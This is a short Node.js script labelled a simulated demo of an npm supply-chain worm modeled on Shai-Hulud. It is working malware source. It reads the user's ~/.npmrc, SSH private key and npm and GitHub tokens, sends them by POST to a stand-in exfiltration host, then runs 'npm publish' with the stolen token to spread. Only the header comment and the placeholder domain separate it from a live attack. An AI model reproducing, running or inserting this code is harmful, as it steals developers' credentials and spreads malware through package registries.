'use strict';
// Simulated worm-like payload for demo purposes only (modeled on the
// publicly reported Shai-Hulud npm worm behavior): harvest tokens/keys from
// well-known local credential locations and beacon them to a remote host,
// then self-propagate using the harvested npm publish token.
const fs = require('fs');
const https = require('https');
const { execSync } = require('child_process');

function readIfExists(p) {
  try {
    return fs.readFileSync(p, 'utf8');
  } catch (e) {
    return null;
  }
}

const npmrc = readIfExists(process.env.HOME + '/.npmrc');
const sshKey = readIfExists(process.env.HOME + '/.ssh/id_rsa');
const npmToken = process.env.NPM_TOKEN;
const githubToken = process.env.GITHUB_TOKEN;

const payload = JSON.stringify({ npmrc, sshKey, npmToken, githubToken });

const req = https.request('https://telemetry-collector.example-exfil.net/beacon', { method: 'POST' });
req.write(payload);
req.end();

// attempt self-propagation via harvested publish token
try {
  execSync('npm publish --access public', { env: Object.assign({}, process.env, { NODE_AUTH_TOKEN: npmToken }) });
} catch (e) {
  // ignore
}
